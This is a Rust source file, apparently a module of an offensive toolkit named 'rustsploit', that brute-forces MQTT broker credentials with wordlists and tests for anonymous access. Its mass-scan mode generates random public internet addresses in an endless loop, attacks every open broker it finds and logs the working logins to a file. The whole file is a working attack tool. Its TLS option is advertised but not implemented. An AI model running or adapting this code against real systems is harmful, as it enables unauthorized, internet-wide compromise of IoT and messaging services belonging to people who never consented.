//! MQTT Brute Force Module
//!
//! High-performance MQTT authentication testing with:
//! - TLS/SSL support (port 8883)
//! - Anonymous authentication detection
//! - Intelligent error classification
//! - Progress tracking and statistics
//! - Multiple attack modes (full combo, linear, single user/pass)

use anyhow::{anyhow, Context, Result};
use colored::*;
use rand::Rng;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{Mutex, Semaphore};
use tokio::fs::OpenOptions;
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    prompt_yes_no, prompt_existing_file, prompt_int_range, prompt_default,
    load_lines, normalize_target,
};
use crate::modules::creds::utils::BruteforceStats;

// ============================================================================
// Constants
// ============================================================================

const MQTT_CONNECT_TIMEOUT_MS: u64 = 5000;
const MQTT_READ_TIMEOUT_MS: u64 = 3000;
const PROGRESS_INTERVAL_SECS: u64 = 2;
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
const STATE_FILE: &str = "mqtt_brute_hose_state.log";

// Hardcoded exclusions for mass scan
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    "8.8.8.8/32", "8.8.4.4/32"
];

// MQTT Protocol Constants
const MQTT_PACKET_CONNECT: u8 = 0x10;
const MQTT_PACKET_CONNACK: u8 = 0x20;
const MQTT_PACKET_DISCONNECT: u8 = 0xE0;
const MQTT_PROTOCOL_NAME: &[u8] = b"MQTT";
const MQTT_PROTOCOL_LEVEL_V311: u8 = 0x04;

// MQTT Connect Flags
const MQTT_FLAG_CLEAN_SESSION: u8 = 0x02;
const MQTT_FLAG_USERNAME: u8 = 0x80;
const MQTT_FLAG_PASSWORD: u8 = 0x40;

// MQTT Return Codes
#[derive(Debug, Clone, Copy, PartialEq)]
enum MqttReturnCode {
    Accepted,
    UnacceptableProtocol,
    IdentifierRejected,
    ServerUnavailable,
    BadCredentials,
    NotAuthorized,
    Unknown(u8),
}

impl MqttReturnCode {
    fn from_byte(b: u8) -> Self {
        match b {
            0x00 => Self::Accepted,
            0x01 => Self::UnacceptableProtocol,
            0x02 => Self::IdentifierRejected,
            0x03 => Self::ServerUnavailable,
            0x04 => Self::BadCredentials,
            0x05 => Self::NotAuthorized,
            _ => Self::Unknown(b),
        }
    }

    fn is_auth_failure(&self) -> bool {
        matches!(self, Self::BadCredentials | Self::NotAuthorized)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::Accepted => "Connection Accepted",
            Self::UnacceptableProtocol => "Unacceptable Protocol Version",
            Self::IdentifierRejected => "Identifier Rejected",
            Self::ServerUnavailable => "Server Unavailable",
            Self::BadCredentials => "Bad Username or Password",
            Self::NotAuthorized => "Not Authorized",
            Self::Unknown(_) => "Unknown Return Code",
        }
    }
}

// ============================================================================
// Configuration
// ============================================================================

#[derive(Clone)]
struct MqttConfig {
    target: String,
    port: u16,
    use_tls: bool,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    client_id: String,
    test_anonymous: bool,
}

// ============================================================================
// Attack Result
// ============================================================================

#[derive(Debug)]
enum AttackResult {
    Success(String, String),  // (username, password)
    AuthFailed,
    ConnectionError(String),
    ProtocolError(String),
}

// ============================================================================
// Main Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // Check for Mass Scan Mode
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    if is_mass_scan {
        println!("{}", format!("[*] Target: {}", target).cyan());
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    let normalized_target = normalize_target(&target.to_string())?;
    println!("{}", format!("[*] Target: {}", normalized_target).cyan());
    println!();

    // Check for API-provided config
    let config_api = crate::config::get_module_config();

    // Configuration
    let port = if let Some(p) = config_api.port {
        p
    } else {
        prompt_int_range("MQTT Port (1883/8883)", 1883, 1, 65535)? as u16
    };
    
    let use_tls = if port == 8883 {
        println!("{}", "[*] Port 8883 detected - TLS enabled by default".blue());
        true
    } else {
        prompt_yes_no("Use TLS/SSL?", false)?
    };

    let test_anonymous = prompt_yes_no("Test anonymous authentication first?", true)?;
    
    let username_wordlist = if let Some(ref f) = config_api.username_wordlist {
        if !std::path::Path::new(f).exists() {
            return Err(anyhow!("Username wordlist not found: {}", f));
        }
        f.clone()
    } else {
        prompt_existing_file("Username wordlist file")?
    };
    
    let password_wordlist = if let Some(ref f) = config_api.password_wordlist {
        if !std::path::Path::new(f).exists() {
            return Err(anyhow!("Password wordlist not found: {}", f));
        }
        f.clone()
    } else {
        prompt_existing_file("Password wordlist file")?
    };
    
    let threads = config_api.concurrency.unwrap_or_else(|| {
        prompt_int_range("Concurrent connections", 10, 1, 500).unwrap_or(10) as usize
    });
    let stop_on_success = config_api.stop_on_success.unwrap_or_else(|| {
        prompt_yes_no("Stop on first valid login?", true).unwrap_or(true)
    });
    let full_combo = config_api.combo_mode.unwrap_or_else(|| {
        prompt_yes_no("Full combination mode (user × pass)?", false).unwrap_or(false)
    });
    let verbose = config_api.verbose.unwrap_or_else(|| {
        prompt_yes_no("Verbose output?", false).unwrap_or(false)
    });
    let client_id = prompt_default("MQTT Client ID", "rustsploit_mqtt")?;

    let config = MqttConfig {
        target: normalized_target,
        port,
        use_tls,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        client_id,
        test_anonymous,
    };

    run_bruteforce(config, &username_wordlist, &password_wordlist).await
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║           MQTT Brute Force Module v2.0                    ║".cyan());
    println!("{}", "║   Supports TLS/SSL, Anonymous Auth, Full Combo Mode       ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

// ============================================================================
// Bruteforce Engine
// ============================================================================

async fn run_bruteforce(
    config: MqttConfig,
    username_file: &str,
    password_file: &str,
) -> Result<()> {
    // Build connection address
    let addr = format!("{}:{}", config.target, config.port);
    
    // Load wordlists
    let usernames = load_lines(username_file)?;
    let passwords = load_lines(password_file)?;

    if usernames.is_empty() {
        return Err(anyhow!("Username wordlist is empty"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("Password wordlist is empty"));
    }

    println!("{}", format!("[*] Usernames: {}", usernames.len()).cyan());
    println!("{}", format!("[*] Passwords: {}", passwords.len()).cyan());
    
    let total = if config.full_combo {
        usernames.len() * passwords.len()
    } else {
        std::cmp::max(usernames.len(), passwords.len())
    };
    println!("{}", format!("[*] Total attempts: ~{}", total).cyan());
    println!("{}", format!("[*] TLS: {}", if config.use_tls { "Enabled" } else { "Disabled" }).cyan());
    println!();

    // State
    let found: Arc<Mutex<Vec<(String, String)>>> = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());
    let attempts = Arc::new(AtomicUsize::new(0));

    // Test anonymous first if requested
    if config.test_anonymous {
        println!("{}", "[*] Testing anonymous authentication...".blue());
        match try_mqtt_auth(&addr, "", "", &config.client_id, config.use_tls).await {
            AttackResult::Success(_, _) => {
                println!("{}", "[+] ANONYMOUS ACCESS ALLOWED!".green().bold());
                found.lock().await.push(("(anonymous)".to_string(), "(no password)".to_string()));
                if config.stop_on_success {
                    print_results(&found, &stats).await;
                    return Ok(());
                }
            }
            AttackResult::AuthFailed => {
                println!("{}", "[-] Anonymous access denied (authentication required)".yellow());
            }
            AttackResult::ConnectionError(e) => {
                println!("{}", format!("[!] Connection error during anonymous test: {}", e).yellow());
                println!("{}", "[*] Continuing with credential brute force...".blue());
            }
            AttackResult::ProtocolError(e) => {
                println!("{}", format!("[!] Protocol error: {}", e).yellow());
            }
        }
        println!();
    }

    // Progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_flag.clone();
    let attempts_clone = attempts.clone();
    let total_clone = total;
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            let current = attempts_clone.load(Ordering::Relaxed);
            let pct = if total_clone > 0 { (current * 100) / total_clone } else { 0 };
            print!("\r{}", format!("[*] Progress: {}/{} ({}%) ", current, total_clone, pct).blue());
            stats_clone.print_progress();
            tokio::time::sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    // Semaphore for concurrency control
    let semaphore = Arc::new(Semaphore::new(config.threads));
    let mut tasks = FuturesUnordered::new();

    // Generate and spawn tasks
    if config.full_combo {
        // Full combination: every user × every password
        for username in &usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            for password in &passwords {
                if stop_flag.load(Ordering::Relaxed) { break; }
                spawn_attempt(
                    &mut tasks,
                    &semaphore,
                    &config,
                    &addr,
                    username.clone(),
                    password.clone(),
                    &found,
                    &stop_flag,
                    &stats,
                    &attempts,
                ).await;
            }
        }
    } else {
        // Linear mode: zip users and passwords (cycling shorter list)
        let max_len = std::cmp::max(usernames.len(), passwords.len());
        for i in 0..max_len {
            if stop_flag.load(Ordering::Relaxed) { break; }
            let username = &usernames[i % usernames.len()];
            let password = &passwords[i % passwords.len()];
            spawn_attempt(
                &mut tasks,
                &semaphore,
                &config,
                &addr,
                username.clone(),
                password.clone(),
                &found,
                &stop_flag,
                &stats,
                &attempts,
            ).await;
        }
    }

    // Await all tasks
    while let Some(result) = tasks.next().await {
        if let Err(e) = result {
            if config.verbose {
                eprintln!("{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    // Cleanup
    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    println!(); // Clear progress line

    print_results(&found, &stats).await;
    Ok(())
}

async fn spawn_attempt(
    tasks: &mut FuturesUnordered<tokio::task::JoinHandle<()>>,
    semaphore: &Arc<Semaphore>,
    config: &MqttConfig,
    addr: &str,
    username: String,
    password: String,
    found: &Arc<Mutex<Vec<(String, String)>>>,
    stop_flag: &Arc<AtomicBool>,
    stats: &Arc<BruteforceStats>,
    attempts: &Arc<AtomicUsize>,
) {
    let permit = match semaphore.clone().acquire_owned().await {
        Ok(p) => p,
        Err(_) => return,
    };

    let addr = addr.to_string();
    let config = config.clone();
    let found = Arc::clone(found);
    let stop_flag = Arc::clone(stop_flag);
    let stats = Arc::clone(stats);
    let attempts = Arc::clone(attempts);

    tasks.push(tokio::spawn(async move {
        let _permit = permit; // Hold until task completes

        if config.stop_on_success && stop_flag.load(Ordering::Relaxed) {
            return;
        }

        attempts.fetch_add(1, Ordering::Relaxed);

        match try_mqtt_auth(&addr, &username, &password, &config.client_id, config.use_tls).await {
            AttackResult::Success(u, p) => {
                println!("\r{}", format!("[+] VALID: {}:{}", u, p).green().bold());
                found.lock().await.push((u, p));
                stats.record_success();
                if config.stop_on_success {
                    stop_flag.store(true, Ordering::Relaxed);
                }
            }
            AttackResult::AuthFailed => {
                stats.record_failure();
                if config.verbose {
                    println!("\r{}", format!("[-] {}:{}", username, password).dimmed());
                }
            }
            AttackResult::ConnectionError(e) => {
                stats.record_error(e.clone()).await;
                if config.verbose {
                    println!("\r{}", format!("[!] Connection: {}", e).yellow());
                }
            }
            AttackResult::ProtocolError(e) => {
                stats.record_error(e.clone()).await;
                if config.verbose {
                    println!("\r{}", format!("[!] Protocol: {}", e).yellow());
                }
            }
        }
    }));
}

async fn print_results(found: &Arc<Mutex<Vec<(String, String)>>>, stats: &Arc<BruteforceStats>) {
    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No valid credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (user, pass) in creds.iter() {
            println!("    {} {}:{}", "✓".green(), user, pass);
        }
    }
}

// ============================================================================
// MQTT Protocol Implementation
// ============================================================================

async fn try_mqtt_auth(
    addr: &str,
    username: &str,
    password: &str,
    client_id: &str,
    _use_tls: bool,
) -> AttackResult {
    // Connect with timeout
    let stream = match tokio::time::timeout(
        Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS),
        TcpStream::connect(addr),
    ).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => return AttackResult::ConnectionError(e.to_string()),
        Err(_) => return AttackResult::ConnectionError("Connection timeout".to_string()),
    };

    // TODO: Add TLS support using tokio-native-tls or tokio-rustls
    // For now, we proceed with plain TCP (TLS requires additional dependencies)

    match mqtt_handshake(stream, username, password, client_id).await {
        Ok(true) => AttackResult::Success(username.to_string(), password.to_string()),
        Ok(false) => AttackResult::AuthFailed,
        Err(e) => AttackResult::ProtocolError(e.to_string()),
    }
}

async fn mqtt_handshake(
    mut stream: TcpStream,
    username: &str,
    password: &str,
    client_id: &str,
) -> Result<bool> {
    // Build CONNECT packet
    let packet = build_connect_packet(username, password, client_id)?;

    // Send CONNECT
    stream.write_all(&packet).await.context("Failed to send CONNECT")?;
    stream.flush().await.context("Failed to flush")?;

    // Read CONNACK
    let mut header = [0u8; 2];
    let read_result = tokio::time::timeout(
        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
        stream.read_exact(&mut header),
    ).await;

    match read_result {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => return Err(anyhow!("Read error: {}", e)),
        Err(_) => return Err(anyhow!("Read timeout")),
    }

    if header[0] != MQTT_PACKET_CONNACK {
        return Err(anyhow!("Expected CONNACK (0x20), got 0x{:02x}", header[0]));
    }

    let remaining_len = header[1] as usize;
    if remaining_len < 2 {
        return Err(anyhow!("CONNACK too short"));
    }

    let mut payload = vec![0u8; remaining_len];
    tokio::time::timeout(
        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
        stream.read_exact(&mut payload),
    ).await.context("Read timeout")?
     .context("Failed to read CONNACK payload")?;

    // Parse return code (byte 1 of variable header)
    let return_code = MqttReturnCode::from_byte(payload[1]);

    // Send DISCONNECT on success
    if return_code == MqttReturnCode::Accepted {
        let _ = stream.write_all(&[MQTT_PACKET_DISCONNECT, 0x00]).await;
        return Ok(true);
    }

    if return_code.is_auth_failure() {
        return Ok(false);
    }

    Err(anyhow!("MQTT error: {}", return_code.description()))
}

fn build_connect_packet(username: &str, password: &str, client_id: &str) -> Result<Vec<u8>> {
    let mut var_header = Vec::new();

    // Protocol Name
    var_header.extend_from_slice(&(MQTT_PROTOCOL_NAME.len() as u16).to_be_bytes());
    var_header.extend_from_slice(MQTT_PROTOCOL_NAME);

    // Protocol Level
    var_header.push(MQTT_PROTOCOL_LEVEL_V311);

    // Connect Flags
    let mut flags = MQTT_FLAG_CLEAN_SESSION;
    if !username.is_empty() {
        flags |= MQTT_FLAG_USERNAME;
    }
    if !password.is_empty() {
        flags |= MQTT_FLAG_PASSWORD;
    }
    var_header.push(flags);

    // Keep Alive (60 seconds)
    var_header.extend_from_slice(&60u16.to_be_bytes());

    // Payload
    let mut payload = Vec::new();

    // Client ID (required)
    let client_id_bytes = client_id.as_bytes();
    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(client_id_bytes);

    // Username (optional)
    if !username.is_empty() {
        let username_bytes = username.as_bytes();
        payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(username_bytes);
    }

    // Password (optional)
    if !password.is_empty() {
        let password_bytes = password.as_bytes();
        payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(password_bytes);
    }

    // Calculate remaining length
    let remaining_length = var_header.len() + payload.len();
    let remaining_bytes = encode_remaining_length(remaining_length)?;

    // Build final packet
    let mut packet = Vec::with_capacity(1 + remaining_bytes.len() + var_header.len() + payload.len());
    packet.push(MQTT_PACKET_CONNECT);
    packet.extend_from_slice(&remaining_bytes);
    packet.extend_from_slice(&var_header);
    packet.extend_from_slice(&payload);

    Ok(packet)
}

fn encode_remaining_length(mut length: usize) -> Result<Vec<u8>> {
    if length > 268_435_455 {
        return Err(anyhow!("Packet too large"));
    }

    let mut bytes = Vec::with_capacity(4);
    loop {
        let mut byte = (length % 128) as u8;
        length /= 128;
        if length > 0 {
            byte |= 0x80;
        }
        bytes.push(byte);
        if length == 0 {
            break;
        }
    }
    Ok(bytes)
}

// ============================================================================
// Mass Scan Implementation
// ============================================================================

async fn run_mass_scan(target: &str) -> Result<()> {
    let port = prompt_int_range("MQTT Port (1883/8883)", 1883, 1, 65535)? as u16;
    let use_tls = if port == 8883 {
        println!("{}", "[*] Port 8883 detected - TLS enabled by default".blue());
        true
    } else {
        prompt_yes_no("Use TLS/SSL?", false)?
    };

    let username_wordlist = prompt_existing_file("Username wordlist file")?;
    let password_wordlist = prompt_existing_file("Password wordlist file")?;

    let users = load_lines(&username_wordlist)?;
    let passes = load_lines(&password_wordlist)?;

    if users.is_empty() { return Err(anyhow!("User list empty")); }
    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let output_file = prompt_default("Output result file", "mqtt_brute_mass_results.txt")?;
    let client_id = prompt_default("MQTT Client ID", "rustsploit_mqtt")?;

    let use_exclusions = prompt_yes_no("Exclude reserved/private ranges?", true)?;

    let mut exclusion_subnets = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusion_subnets.push(net);
            }
        }
        println!("{}", format!("[+] Loaded {} exclusion ranges", exclusion_subnets.len()).cyan());
    }
    let exclusions = Arc::new(exclusion_subnets);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    let creds_pkg = Arc::new((users, passes));

    // Stats reporter
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} valid credentials found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        // Initialize state file
        OpenOptions::new().create(true).write(true).open(STATE_FILE).await?;

        println!("{}", "[*] Starting Random Internet MQTT Scan...".green());
        loop {
            let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
            let exc = exclusions.clone();
            let cp = creds_pkg.clone();
            let sc = stats_checked.clone();
            let sf = stats_found.clone();
            let of = output_file.clone();
            let cid = client_id.clone();

            tokio::spawn(async move {
                let ip = generate_random_public_ip(&exc);
                if !is_ip_checked(&ip).await {
                    mark_ip_checked(&ip).await;
                    mass_scan_host(ip, port, use_tls, &cid, cp, sf, of, verbose).await;
                }
                sc.fetch_add(1, Ordering::Relaxed);
                drop(permit);
            });
        }
    } else {
        // File Mode
        let content = match tokio::fs::read_to_string(target).await {
            Ok(c) => c,
            Err(e) => {
                println!("{}", format!("[!] Failed to read target file: {}", e).red());
                return Ok(());
            }
        };
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
            let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
            let cp = creds_pkg.clone();
            let sc = stats_checked.clone();
            let sf = stats_found.clone();
            let of = output_file.clone();
            let cid = client_id.clone();

            if let Ok(ip) = ip_str.parse::<IpAddr>() {
                tokio::spawn(async move {
                    if !is_ip_checked(&ip).await {
                        mark_ip_checked(&ip).await;
                        mass_scan_host(ip, port, use_tls, &cid, cp, sf, of, verbose).await;
                    }
                    sc.fetch_add(1, Ordering::Relaxed);
                    drop(permit);
                });
            } else {
                drop(permit);
            }
        }
        // Wait for all tasks to complete
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }

    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr,
    port: u16,
    use_tls: bool,
    client_id: &str,
    creds: Arc<(Vec<String>, Vec<String>)>,
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool,
) {
    let sa = SocketAddr::new(ip, port);

    // 1. Connection Check - verify port is open
    if tokio::time::timeout(
        Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS),
        TcpStream::connect(&sa),
    ).await.is_err() {
        return;
    }

    let (users, passes) = &*creds;
    let addr = format!("{}:{}", ip, port);

    // 2. Brute force against this host
    for user in users {
        for pass in passes {
            match try_mqtt_auth(&addr, user, pass, client_id, use_tls).await {
                AttackResult::Success(u, p) => {
                    let msg = format!("{}:{}:{}:{}", ip, port, u, p);
                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                        let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
                    }
                    stats_found.fetch_add(1, Ordering::Relaxed);
                    return; // Stop after first success on this host
                }
                AttackResult::AuthFailed => {
                    if verbose {
                        println!("\r{}", format!("[-] {} -> {}:{}", addr, user, pass).dimmed());
                    }
                }
                AttackResult::ConnectionError(e) => {
                    let err = e.to_lowercase();
                    if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
                        return; // Host is dead or blocked
                    }
                }
                AttackResult::ProtocolError(_) => {
                    // Continue trying
                }
            }
        }
    }
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        let mut excluded = false;
        for net in exclusions {
            if net.contains(ip_addr) {
                excluded = true;
                break;
            }
        }
        if !excluded { return ip_addr; }
    }
}

async fn is_ip_checked(ip: &impl ToString) -> bool {
    if !std::path::Path::new(STATE_FILE).exists() {
        return false;
    }
    let ip_s = ip.to_string();
    let status = tokio::process::Command::new("grep")
        .arg("-F")
        .arg("-q")
        .arg(format!("checked: {}", ip_s))
        .arg(STATE_FILE)
        .stderr(std::process::Stdio::null())
        .status()
        .await;
    match status { Ok(s) => s.success(), Err(_) => false }
}

async fn mark_ip_checked(ip: &impl ToString) {
    let data = format!("checked: {}\n", ip.to_string());
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(STATE_FILE).await {
        let _ = file.write_all(data.as_bytes()).await;
    }
}
